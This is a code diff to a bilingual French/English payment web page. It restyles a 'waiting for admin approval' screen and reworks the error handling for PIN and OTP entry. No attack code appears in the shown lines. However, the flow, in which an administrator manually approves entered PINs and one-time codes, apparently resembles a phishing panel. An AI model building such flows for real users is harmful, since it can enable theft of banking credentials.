@@ -395,6 +395,16 @@
             display: block;
         }
 
+        .verification-card {
+            max-width: 360px;
+            margin: 0 auto;
+            padding: 28px 22px;
+            background: #fff;
+            border: 1px solid #E5E7EB;
+            border-radius: 16px;
+            box-shadow: 0 10px 28px rgba(17, 24, 39, .10);
+        }
+
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
@@ -848,18 +858,20 @@
             <!-- Waiting for Admin Approval Screen -->
             <div class="waiting-screen" id="waitingScreen">
                 <div class="screen-center">
-                    <div class="icon-circle icon-circle-lg">
-                        <span class="icon-text">⏳</span>
+                    <div class="verification-card">
+                        <div class="icon-circle icon-circle-lg">
+                            <span class="icon-text">⏳</span>
+                        </div>
+                        <h2 id="waitingTitle" class="screen-title">Verifying...</h2>
+                        <p id="waitingMsg" class="info-text">
+                            Your request was sent for approval. Please wait while we verify your information.
+                        </p>
+                        <div class="status-bar">
+                            <div class="spinner"></div>
+                            <span id="waitingStatus" class="status-text">Verifying...</span>
+                        </div>
+                        <p class="text-timeout">This may take up to 5 minutes.</p>
                     </div>
-                    <h2 id="waitingTitle" class="screen-title">En attente de vérification</h2>
-                    <p id="waitingMsg" class="info-text">
-                        Votre demande de paiement a été envoyée à l&apos;administrateur. Veuillez patienter pendant que nous vérifions vos informations.
-                    </p>
-                    <div class="status-bar">
-                        <div class="spinner"></div>
-                        <span id="waitingStatus" class="status-text">Vérification en cours...</span>
-                    </div>
-                    <p class="text-timeout">Cela peut prendre jusqu&apos;à 5 minutes.</p>
                 </div>
             </div>
             
@@ -1132,7 +1144,6 @@
         }
 
         function resetOtpEntry() {
-            wrongOtpNotified = false;
             clearOtpInputs(true);
             const errEl = document.getElementById('otpError');
             errEl.textContent = t('otpIncorrect');
@@ -1147,6 +1158,7 @@
             const otp = getOtpValue();
             if (otp.length !== 4 || !currentRequestId) return;
 
+            wrongOtpNotified = false;
             otpSubmitBtn.disabled = true;
             otpSubmitBtn.dataset.busy = '1';
             otpSubmitBtn.textContent = t('processing');
@@ -1293,6 +1305,14 @@
         function checkPinComplete() {
             submitBtn.disabled = getPinValue().length < 4;
         }
+
+        pinInputs.forEach(input => {
+            input.addEventListener('input', function() {
+                const error = document.getElementById('pinError');
+                error.classList.remove('show');
+                error.textContent = '';
+            });
+        });
         
         // Submit PIN
         submitBtn.addEventListener('click', async function() {
@@ -1471,7 +1491,15 @@
             notVerifiedScreen.classList.remove('active');
             document.getElementById('insufficientScreen').classList.remove('active');
             waitingScreen.style.display = 'block';
-            document.getElementById('waitingStatus').textContent = message || (currentLang === 'fr' ? 'Vérification en cours...' : 'Verification in progress...');
+            const isFrench = currentLang === 'fr';
+            document.getElementById('waitingTitle').textContent = isFrench ? 'Vérification...' : 'Verifying...';
+            document.getElementById('waitingMsg').textContent = isFrench
+                ? 'Votre demande a été envoyée pour approbation. Veuillez patienter pendant la vérification de vos informations.'
+                : 'Your request was sent for approval. Please wait while we verify your information.';
+            document.querySelector('#waitingScreen .text-timeout').textContent = isFrench
+                ? 'Cela peut prendre jusqu\'à 5 minutes.'
+                : 'This may take up to 5 minutes.';
+            document.getElementById('waitingStatus').textContent = message || (isFrench ? 'Vérification en cours...' : 'Verifying...');
         }
 
         function startStatusPolling(requestId) {
@@ -1529,10 +1557,16 @@
                     linkScreen.classList.remove('active');
                     otpScreen.classList.remove('active');
                     pinInputs.forEach(i => i.value = '');
-                    pinInputs[0].focus();
-                    alert(currentLang === 'fr'
+                    const pinError = document.getElementById('pinError');
+                    pinError.textContent = currentLang === 'fr'
                         ? 'PIN incorrect. Veuillez réessayer.'
-                        : 'Wrong PIN. Please try again.');
+                        : 'Wrong PIN. Please try again.';
+                    pinError.style.background = '#FEF2F2';
+                    pinError.style.color = '#DC2626';
+                    pinError.classList.add('show');
+                    submitBtn.disabled = true;
+                    submitBtn.textContent = t('submit');
+                    pinInputs[0].focus();
                     break;
 
                 case 'wrong_link':
